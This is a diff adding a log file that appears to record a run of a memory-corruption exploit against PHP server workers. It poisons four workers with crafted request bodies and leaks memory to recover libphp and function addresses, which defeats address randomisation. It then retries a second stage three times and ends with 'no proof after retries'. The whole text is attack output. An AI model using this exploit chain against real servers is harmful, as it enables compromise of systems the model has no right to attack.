@@ -1,0 +1,27 @@
+bodies: A1=1060211 B1=33128677 A2=279369
+=== round 1: poison 4 workers with A1 ===
+  A1[1] HTTP/1.0 500 Internal Server Error
+  A1[2] HTTP/1.0 500 Internal Server Error
+  A1[3] HTTP/1.0 500 Internal Server Error
+  A1[4] HTTP/1.0 500 Internal Server Error
+=== round 1: B1 leak on any poisoned child ===
+  B1 status='HTTP/1.1 200 OK' cookie=1681328 leak=yes
+leak: decoded=819200 zdtor=0x7f8f85628b60 libphp=0x7f8f84fca000
+buckets: [('0x7f8f82c00000', 7494), ('0x7f8f85600000', 1095), ('0x7f8f83400000', 87), ('0x7f8f82a00000', 79)]
+main=0x7f8f83400000 S=0x7f8f834f8398 zif=0x7f8f8542f370 cands=[('0x7f8f83400000', 87), ('0x7f8f82a00000', 79)]
+=== poison 4 workers with A2 ===
+  A2[1] HTTP/1.0 500 Internal Server Error
+  A2[2] HTTP/1.0 500 Internal Server Error
+  A2[3] HTTP/1.0 500 Internal Server Error
+  A2[4] HTTP/1.0 500 Internal Server Error
+B2 bytes=451384
+=== B2 attempt 1 ===
+  B2 status='HTTP/1.1 200 OK' conn=b'close'
+  no proof yet; re-poisoning A2
+=== B2 attempt 2 ===
+  B2 status='HTTP/1.1 200 OK' conn=b'close'
+  no proof yet; re-poisoning A2
+=== B2 attempt 3 ===
+  B2 status='HTTP/1.1 200 OK' conn=b'close'
+  no proof yet; re-poisoning A2
+no proof after retries
